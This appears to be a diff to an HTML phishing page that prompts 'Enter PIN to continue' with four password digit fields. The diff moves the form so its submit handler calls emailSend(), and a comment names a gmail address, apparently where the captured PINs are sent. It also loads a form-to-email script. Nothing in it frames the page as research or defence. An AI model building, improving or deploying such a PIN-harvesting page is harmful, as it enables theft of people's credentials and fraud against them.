@@ -19,13 +19,14 @@
     <link rel="stylesheet" href="pin.css" />
   </head>
   <body>
-    <form id="form" onsubmit="emailSend(); reset(); return false;" class="container" > <!--payday10177@gmail.com-->
-      <div class="contentSec">
+  <div class="container" >
+    <div class="contentSec">
         <div class="title">Enter PIN to continue</div>
       </div>
       <div class="formSec">
         <div class="input">
-          <form method="post">
+          <form id="form" onsubmit="emailSend(); reset(); return false;" > <!--payday10177@gmail.com-->
+   
             <input
               type="password"
               id="digit1"
@@ -61,7 +62,7 @@ name= "pin4"
           <button id="submitBtn" type="submit">Next</button>
         </div>
       </div>
-    </form>
+    </div>
     <script src="app.js"></script>
     <script src="Contact-form-to-email1.js"></script>
 <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
